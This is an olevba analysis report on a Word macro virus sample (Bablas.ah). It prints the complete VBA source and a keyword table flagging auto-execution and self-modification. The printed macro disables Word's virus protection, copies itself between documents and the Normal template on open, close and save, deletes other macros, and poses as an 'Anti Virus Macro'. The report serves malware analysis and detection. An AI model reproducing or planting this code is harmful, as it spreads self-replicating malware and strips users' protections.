olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ah
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ah - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO avm.bas 
in file: Virus.MSWord.Bablas.ah - OLE stream: 'Macros/VBA/avm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'avm ini bukanlah sebuah virus
'tapi hanyalah sebuah indikator
'ada tidaknya virus macro di komputer ini
'bagi mereka yang dapat membaca tulisan ini
'alangkah baiknya jika kita saling tukar pikiran
'untuk membuat suatu anti virus macro
'email saja pada cholis@indonet.com atau cholis@plasa.com

Sub Terus()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub
Sub ToolsMacro()
MsgBox "Komputer anda masih dalam pengawasan kami", vbInformation, "Anti Virus Macro"
End Sub
Sub ViewVbCode()
    ToolsMacro
End Sub
Sub FileTemplates()
    ToolsMacro
End Sub
Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Terus
End Sub
Sub PukulDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "avm" Then DocOk = True
        If Obj.Name <> "avm" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="avm", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Sub PukulTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "avm" Then NorOk = True
        If Obj.Name <> "avm" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="avm", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub
Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        PukulDocument
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Terus
    PukulTemplate
    On Error Resume Next
    NormalTemplate.Save
End Sub
Sub AutoClose()
    PukulDocument
End Sub

Sub FileClose()
    AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        PukulDocument
        PukulTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.avm.PukulDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:02:09"), "Normal.avm.Ancurin"
    End If
End Sub

Sub AutoExec()
    MsgBox "Saat ini komputer anda bebas virus macro" & Chr(13) & "Hubungi kami jika pesan ini tidak muncul kembali" & Chr(13) & "Di cholis@indonet.com", vbInformation, "Anti Virus Macro"
    WordBasic.DisableAutoMacros True
    Terus
    Application.OnTime Now + TimeValue("00:02:09"), "Normal.avm.Ancurin"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

